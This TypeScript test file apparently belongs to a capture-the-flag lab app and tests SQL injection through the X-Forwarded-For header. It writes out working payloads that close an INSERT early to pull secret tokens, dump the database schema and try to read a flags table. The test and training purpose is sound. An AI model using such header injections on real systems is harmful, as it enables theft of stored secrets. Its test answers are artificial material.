import { apiRequest, expectFlag } from "../helpers/api";
import { FLAGS } from "../helpers/flags";

interface TrackingResponse {
  success: boolean;
  logged: Record<string, unknown>[];
  error?: string;
  flag?: string;
  message?: string;
}

const track = (forwardedFor?: string) =>
  apiRequest<TrackingResponse>("/api/tracking", {
    method: "POST",
    body: JSON.stringify({ path: "/", sessionId: "test" }),
    headers: forwardedFor ? { "X-Forwarded-For": forwardedFor } : {},
  });

/** Closes the INSERT value list early and logs a column from another table. */
const exfiltrate = (subquery: string) =>
  `1.2.3.4', (${subquery}), '/x', NULL, datetime('now'))--`;

describe("SQL Injection - X-Forwarded-For", () => {
  it("returns the flag once the injected row carries the internal canary", async () => {
    const { status, data } = await track(
      exfiltrate(
        "SELECT token FROM internal_secrets WHERE slug='x-forwarded-for-sql-injection'"
      )
    );

    expect(status).toBe(200);
    expectFlag(data, FLAGS.X_FORWARDED_FOR_SQL_INJECTION);
    expect(JSON.stringify(data.logged)).toContain("CANARY-");
  });

  it("leaks the schema through the logged row, which is how the canary is found", async () => {
    const { status, data } = await track(
      exfiltrate(
        "SELECT group_concat(name) FROM sqlite_master WHERE type='table'"
      )
    );

    expect(status).toBe(200);
    expect(JSON.stringify(data.logged)).toContain("internal_secrets");
    expect(data).not.toHaveProperty("flag");
  });

  it("does not reward a SQL keyword that extracts nothing", async () => {
    const { status, data } = await track("UNION");

    expect(status).toBe(200);
    expect(data).not.toHaveProperty("flag");
    expect(data.message).toContain("SQL syntax detected");
  });

  it("reports the SQLite error when the payload does not compile", async () => {
    const { status, data } = await track("1.2.3.4', (SELECT token FROM");

    expect(status).toBe(200);
    expect(data.success).toBe(false);
    expect(data.error).toContain("syntax error");
    expect(data).not.toHaveProperty("flag");
  });

  it("blocks access to the flags table via the header", async () => {
    const { status, data } = await track(
      "127.0.0.1' UNION SELECT flag FROM flags --"
    );

    expect(status).toBe(403);
    expect((data as unknown as { error: string }).error).toContain(
      "Access to flags table is not allowed"
    );
  });

  it("never echoes a flag value extracted from the flags table", async () => {
    const { status, data } = await track(
      exfiltrate("SELECT group_concat(flag) FROM main.flags")
    );

    expect(status).toBe(200);
    expect(JSON.stringify(data.logged)).not.toContain("OSS{");
    expect(data).not.toHaveProperty("flag");
  });

  it("logs a normal visit without returning a flag", async () => {
    const { status, data } = await track();

    expect(status).toBe(200);
    expect(data.success).toBe(true);
    expect(data.logged).toHaveLength(1);
    expect(data).not.toHaveProperty("flag");
  });
});
